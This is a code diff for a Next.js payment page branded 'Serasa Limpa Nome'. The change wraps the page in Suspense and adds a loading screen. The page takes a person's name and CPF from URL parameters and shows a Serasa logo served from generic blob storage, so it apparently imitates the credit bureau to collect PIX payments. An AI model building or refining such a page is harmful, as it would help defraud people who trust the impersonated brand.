@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, Suspense } from "react"
 import { useSearchParams } from "next/navigation"
 import Image from "next/image"
 import { Card } from "@/components/ui/card"
@@ -17,7 +17,36 @@ interface PixData {
   }
 }
 
-export default function PagamentoPage() {
+function LoadingFallback() {
+  return (
+    <div className="min-h-screen bg-gray-50">
+      <header className="bg-pink-600 text-white p-4 shadow-lg">
+        <div className="max-w-4xl mx-auto flex items-center gap-3">
+          <Image
+            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
+            alt="Serasa"
+            width={120}
+            height={40}
+            className="h-8 w-auto"
+          />
+          <div className="flex-1">
+            <h1 className="font-semibold">Pagamento PIX</h1>
+            <p className="text-sm opacity-90">Serasa Limpa Nome</p>
+          </div>
+        </div>
+      </header>
+      <div className="max-w-lg mx-auto p-4 mt-4">
+        <Card className="p-8 text-center">
+          <Loader2 className="w-12 h-12 text-pink-600 animate-spin mx-auto mb-4" />
+          <h2 className="text-xl font-semibold text-gray-800 mb-2">Carregando...</h2>
+          <p className="text-gray-600">Aguarde enquanto preparamos seu pagamento</p>
+        </Card>
+      </div>
+    </div>
+  )
+}
+
+function PagamentoContent() {
   const searchParams = useSearchParams()
   const nome = searchParams.get("nome") || ""
   const cpf = searchParams.get("cpf") || ""
@@ -363,5 +392,13 @@ export default function PagamentoPage() {
         ) : null}
       </div>
     </div>
+  )
+}
+
+export default function PagamentoPage() {
+  return (
+    <Suspense fallback={<LoadingFallback />}>
+      <PagamentoContent />
+    </Suspense>
   )
 }
